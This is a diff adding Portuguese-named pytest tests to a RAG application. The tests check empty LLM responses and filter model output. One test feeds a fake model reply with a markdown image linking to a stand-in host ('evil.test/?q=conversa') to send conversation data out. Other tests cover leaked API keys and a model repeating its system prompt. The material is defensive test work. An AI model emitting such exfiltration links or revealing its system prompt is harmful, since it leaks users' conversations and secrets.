@@ -176,3 +176,39 @@ def test_formatter_gera_uma_linha_json_valida():
     linha = JsonFormatter().format(registro)
     assert "\n" not in linha
     assert json.loads(linha)["evento"] == "x" and json.loads(linha)["nivel"] == "INFO"
+
+
+def test_llm_groq_sem_choices_vira_llm_resposta_vazia_e_nao_erro_generico(indice, monkeypatch):
+    from types import SimpleNamespace
+
+    from apoio import ClienteFalso
+    from rag import llm as modulo_llm
+
+    monkeypatch.setattr(modulo_llm, "chave_groq_configurada", lambda: True)
+    monkeypatch.setattr(modulo_llm, "_obter_cliente",
+                        lambda: ClienteFalso(lambda _: SimpleNamespace(choices=[], usage=None)))
+    resposta = _ask(_app(indice, modulo_llm.llm_groq), {"pergunta": PERGUNTA_SQL})
+    assert resposta.status_code == 502
+    assert resposta.get_json()["erro"]["codigo"] == "llm_resposta_vazia"
+
+
+class TestSaidaDoModeloNoRag:
+    def test_imagem_markdown_nao_sai_na_resposta(self, indice):
+        llm = LlmEspiao(resposta="Veja ![dado](https://evil.test/?q=conversa) e responda.")
+        corpo = _ask(_app(indice, llm), {"pergunta": PERGUNTA_SQL}).get_json()
+        assert "evil.test" not in corpo["resposta"]
+        assert "![" not in corpo["resposta"]
+
+    def test_segredo_repetido_pelo_modelo_e_mascarado(self, indice):
+        chave_falsa = "gsk_" + "x1Y2" * 13
+        llm = LlmEspiao(resposta=f"A chave e {chave_falsa}, use com cuidado.")
+        corpo = _ask(_app(indice, llm), {"pergunta": PERGUNTA_SQL}).get_json()
+        assert chave_falsa not in corpo["resposta"]
+
+    def test_copia_do_prompt_de_sistema_vira_recusa_padrao(self, indice):
+        from core.seguranca import CAT_PROMPT, RESPOSTAS
+        from rag.prompts import prompts_padrao
+
+        llm = LlmEspiao(resposta=prompts_padrao().mensagem_sistema)
+        corpo = _ask(_app(indice, llm), {"pergunta": PERGUNTA_SQL}).get_json()
+        assert corpo["resposta"] == RESPOSTAS[CAT_PROMPT]
